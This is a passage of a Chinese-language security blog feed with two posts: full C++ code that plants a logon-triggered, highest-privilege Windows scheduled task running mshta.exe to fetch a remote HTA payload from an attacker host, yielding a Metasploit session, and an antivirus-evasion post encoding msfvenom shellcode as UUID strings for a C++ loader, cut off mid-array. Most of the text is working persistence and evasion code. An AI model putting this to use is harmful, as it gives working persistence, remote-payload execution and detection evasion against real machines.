class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule,<span class="comment">//要获取文件名的模块名柄,null表示当前模块</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpFileName,<span class="comment">//输出参数，存放取得的文件名 TCHAR lpfilename</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nSize<span class="comment">//参数的长度     MAX_PATH</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用COM组件创建计划任务</title>
    <link href="/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/>
    <url>/2021/02/28/%E4%BD%BF%E7%94%A8COM%E7%BB%84%E4%BB%B6%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>Windows系统可以设置计划任务来指向一些定时任务。本书中计划任务的触发条件是在用户登陆时触发，执行启动指定路径程序的操作</p><p>创建计划任务时涉及到COM组件接口的调用，要求管理员权限，程序逻辑概括为三个部分，分别是初始化操作、创建计划任务操作、删除计划任务操作。</p><h2 id="1-初始化操作"><a href="#1-初始化操作" class="headerlink" title="1.初始化操作"></a>1.初始化操作</h2><p>由于使用COM组件，所以必须调用CoInitialize函数来初始化COM接口环境，这样才能使用COM接口函数。同时也要先获取ITaskService对象指针以及ITaskFolder指针，这两个指针对象主要用来进行计划任务的创建操作。</p><p>1.CoInitialize初始化COM组件</p><p>2.CoCreateInstance创建任务服务对象</p><p>3.连接到任务服务</p><p>4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务</p><p>初始化操作完成后直接操作ITaskService对象以及ITaskFolder对象</p><h2 id="2-创建计划任务"><a href="#2-创建计划任务" class="headerlink" title="2.创建计划任务"></a>2.创建计划任务</h2><p>从ITaskService对象中创建一个任务定义对象ITaskDefinition，它被用于创建任务，然后对任务定义对象ITaskDefinition进行设置</p><p>设置注册信息，包括设置作者信息。</p><p>设置主体信息，包括登陆类型、运行权限。</p><p>设置配置信息，包括使用电池运行时是否停止</p><p>设置操作信息，包括要启动的程序，并设置程序路径和参数</p><p>设置触发器，在用户登陆时执行计划任务</p><h2 id="3-删除计划任务"><a href="#3-删除计划任务" class="headerlink" title="3.删除计划任务"></a>3.删除计划任务</h2><p>调用DeleteTask接口函数删除指定名称的计划任务</p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>这里使用mshta上线，无文件上线的方法很多，不局限这一种</p><p>将计划任务设置为执行c:\windows\system32\mshta.exe <a href="http://192.168.111.129:8080/p7ptgsev.hta">http://192.168.111.129:8080/p7ptgsev.hta</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atlbase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlobj_core.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;taskschd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;taskschd.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">ITaskService* m_lpITS = <span class="literal">NULL</span>;</span><br><span class="line">ITaskFolder* m_lpRootFolder = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化COM组件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//1.CoInitialize初始化COM组件</span></span><br><span class="line">HRESULT hr = CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;初始化COM组件失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.CoCreateInstance创建任务服务对象</span></span><br><span class="line">hr = CoCreateInstance(CLSID_TaskScheduler, <span class="literal">NULL</span>, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&amp;m_lpITS);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;创建任务服务失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3.连接到任务服务</span></span><br><span class="line">hr = m_lpITS-&gt;Connect(<span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>());</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;连接服务失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务</span></span><br><span class="line">hr = m_lpITS-&gt;GetFolder(<span class="keyword">_bstr_t</span>(<span class="string">&quot;\\&quot;</span>), &amp;m_lpRootFolder);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr)) &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;获取指针失败&quot;</span>, <span class="string">L&quot;Failed&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载COM组件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnInit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_lpITS)</span><br><span class="line">&#123;</span><br><span class="line">m_lpITS-&gt;Release();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (m_lpRootFolder)</span><br><span class="line">&#123;</span><br><span class="line">m_lpRootFolder-&gt;Release();</span><br><span class="line">&#125;</span><br><span class="line">::CoUninitialize();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建计划任务</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateTask</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* lpszTaskName,<span class="keyword">const</span> <span class="keyword">char</span>* lpszProgramPath,<span class="keyword">const</span> <span class="keyword">char</span>* lpszParameters,<span class="keyword">const</span> <span class="keyword">char</span>* lpszAuthor)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 创建任务定义对象来创建任务</span></span><br><span class="line">ITaskDefinition* pTaskDefinition = <span class="literal">NULL</span>;</span><br><span class="line">HRESULT hr = m_lpITS-&gt;NewTask(<span class="number">0</span>, &amp;pTaskDefinition);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置注册信息 */</span></span><br><span class="line">IRegistrationInfo* pRegInfo = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">CComVariant <span class="title">variantAuthor</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">variantAuthor = lpszAuthor;</span><br><span class="line">hr = pTaskDefinition-&gt;get_RegistrationInfo(&amp;pRegInfo);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置作者信息</span></span><br><span class="line">hr = pRegInfo-&gt;put_Author(variantAuthor.bstrVal);</span><br><span class="line">pRegInfo-&gt;Release();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置登录类型和运行权限 */</span></span><br><span class="line">IPrincipal* pPrincipal = <span class="literal">NULL</span>;</span><br><span class="line">hr = pTaskDefinition-&gt;get_Principal(&amp;pPrincipal);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置登录类型</span></span><br><span class="line">hr = pPrincipal-&gt;put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);</span><br><span class="line"><span class="comment">// 设置运行权限</span></span><br><span class="line"><span class="comment">// 最高权限</span></span><br><span class="line">hr = pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST);</span><br><span class="line">pPrincipal-&gt;Release();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置其他信息 */</span></span><br><span class="line">ITaskSettings* pSettting = <span class="literal">NULL</span>;</span><br><span class="line">hr = pTaskDefinition-&gt;get_Settings(&amp;pSettting);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置其他信息</span></span><br><span class="line">hr = pSettting-&gt;put_StopIfGoingOnBatteries(VARIANT_FALSE);</span><br><span class="line">hr = pSettting-&gt;put_DisallowStartIfOnBatteries(VARIANT_FALSE);</span><br><span class="line">hr = pSettting-&gt;put_AllowDemandStart(VARIANT_TRUE);</span><br><span class="line">hr = pSettting-&gt;put_StartWhenAvailable(VARIANT_FALSE);</span><br><span class="line">hr = pSettting-&gt;put_MultipleInstances(TASK_INSTANCES_PARALLEL);</span><br><span class="line">pSettting-&gt;Release();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 创建执行动作 */</span></span><br><span class="line">IActionCollection* pActionCollect = <span class="literal">NULL</span>;</span><br><span class="line">hr = pTaskDefinition-&gt;get_Actions(&amp;pActionCollect);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">IAction* pAction = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 创建执行操作</span></span><br><span class="line">hr = pActionCollect-&gt;Create(TASK_ACTION_EXEC, &amp;pAction);</span><br><span class="line">pActionCollect-&gt;Release();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 设置执行程序路径和参数 */</span></span><br><span class="line"><span class="function">CComVariant <span class="title">variantProgramPath</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line"><span class="function">CComVariant <span class="title">variantParameters</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">IExecAction* pExecAction = <span class="literal">NULL</span>;</span><br><span class="line">hr = pAction-&gt;QueryInterface(IID_IExecAction, (PVOID*)(&amp;pExecAction));</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line">pAction-&gt;Release();</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">pAction-&gt;Release();</span><br><span class="line"><span class="comment">// 设置程序路径和参数</span></span><br><span class="line">variantProgramPath = lpszProgramPath;</span><br><span class="line">variantParameters = lpszParameters;</span><br><span class="line">pExecAction-&gt;put_Path(variantProgramPath.bstrVal);</span><br><span class="line">pExecAction-&gt;put_Arguments(variantParameters.bstrVal);</span><br><span class="line">pExecAction-&gt;Release();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 创建触发器，实现用户登陆自启动 */</span></span><br><span class="line">ITriggerCollection* pTriggers = <span class="literal">NULL</span>;</span><br><span class="line">hr = pTaskDefinition-&gt;get_Triggers(&amp;pTriggers);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建触发器,把触发器设置为</span></span><br><span class="line">ITrigger* pTrigger = <span class="literal">NULL</span>;</span><br><span class="line">hr = pTriggers-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注册任务计划  */</span></span><br><span class="line">IRegisteredTask* pRegisteredTask = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">CComVariant <span class="title">variantTaskName</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">variantTaskName = lpszTaskName;</span><br><span class="line">hr = m_lpRootFolder-&gt;RegisterTaskDefinition(variantTaskName.bstrVal,</span><br><span class="line">pTaskDefinition,</span><br><span class="line">TASK_CREATE_OR_UPDATE,</span><br><span class="line"><span class="keyword">_variant_t</span>(),</span><br><span class="line"><span class="keyword">_variant_t</span>(),</span><br><span class="line">TASK_LOGON_INTERACTIVE_TOKEN,</span><br><span class="line"><span class="keyword">_variant_t</span>(<span class="string">&quot;&quot;</span>),</span><br><span class="line">&amp;pRegisteredTask);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line">pTaskDefinition-&gt;Release();</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">pTaskDefinition-&gt;Release();</span><br><span class="line">pRegisteredTask-&gt;Release();</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除计划任务</span></span><br><span class="line"><span class="function">BOOL <span class="title">DeleteTask</span><span class="params">(<span class="keyword">char</span>* lpszTaskName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == m_lpRootFolder)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">CComVariant <span class="title">variantTaskName</span><span class="params">(<span class="literal">NULL</span>)</span></span>;</span><br><span class="line">variantTaskName = lpszTaskName;</span><br><span class="line">HRESULT hr = m_lpRootFolder-&gt;DeleteTask(variantTaskName.bstrVal, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* lpszTaskName = <span class="string">&quot;aaasacwss&quot;</span>;   <span class="comment">//任务名</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* lpszProgramPath = <span class="string">&quot;c:\\windows\\system32\\mshta.exe&quot;</span>;  <span class="comment">//要执行的程序路径</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* lpszParameters = <span class="string">&quot;http://192.168.111.129:8080/p7ptgsev.hta&quot;</span>;     <span class="comment">//程序参数</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* lpszAuthor = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">Init();</span><br><span class="line">BOOL bRet=CreateTask(lpszTaskName, lpszProgramPath, lpszParameters, lpszAuthor);</span><br><span class="line"><span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create Task Failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">UnInit();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Successd&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行</p><p><a href="https://imgbed.cn/preview?id=603b58fbe028a50001c1d1b4"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/96f48898-e4f9-49b8-a268-eb5857e5af25.png" alt="imgbed.cn图床"></a></p><p>添加成功</p><p><a href="https://imgbed.cn/preview?id=603b590ede602f00013761dd"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/d3bed366-0653-445c-bb85-c3ca43d26f8b.png" alt="imgbed.cn图床"></a></p><p>使用msf中的hta_server产生hta文件并传递payload，重启后返回一个Session</p><p><a href="https://imgbed.cn/preview?id=603b5904fac28b0001cfe814"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/914aa532-5678-4d12-b56a-46493f2b9c6d.png" alt="imgbed.cn图床"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>uuid免杀</title>
    <link href="/2021/02/27/uuid%E5%85%8D%E6%9D%80/"/>
    <url>/2021/02/27/uuid%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象</p><h2 id="将shellcode转换为uuid"><a href="#将shellcode转换为uuid" class="headerlink" title="将shellcode转换为uuid"></a>将shellcode转换为uuid</h2><p>用msf生成shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec CMD&#x3D;&quot;calc.exe&quot; -f c</span><br></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=6039dc936cea45000128758e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/d6eab119-32a6-4f11-8d66-7275a9f557ee.png" alt="imgbed.cn图床"></a></p><p>16个字节转换为一个uuid值，不满时用\x00填充，\x00占一个字节</p><p>首先用python把shellcode转换为uuid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid.UUID(bytes_le&#x3D;u)</span><br></pre></td></tr></table></figure><p>uuid转换为字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uuid.UUID(&#39;1f748bef-481c-fe01-8b34-ae4801f799ff&#39;).bytes_le</span><br></pre></td></tr></table></figure><p>将shellcode转换为uuid，不足十六个字节的用\x00补全</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&#x27;</span></span><br><span class="line">shellcodelist=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(shellcode)%<span class="number">16</span>!=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(shellcode)%<span class="number">16</span>!=<span class="number">0</span>:</span><br><span class="line">        shellcode+=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)//<span class="number">16</span>):</span><br><span class="line">    u=<span class="built_in">str</span>(uuid.UUID(bytes_le=shellcode[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>]))</span><br><span class="line">    shellcodelist.append(u)</span><br><span class="line">print(shellcodelist)</span><br></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=6039dc9ab6ce210001ce90fa"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/a031db93-5756-4b36-b3af-26a7daf85873.png" alt="imgbed.cn图床"></a></p><p>加载shellcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Rpcrt4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;e48348fc-e8f0-00c0-0000-415141505251&quot;</span>,</span><br><span class="line"><span class="string">&quot;d2314856-4865-528b-6048-8b5218488b52&quot;</span>,</span><br><span class="line"><span 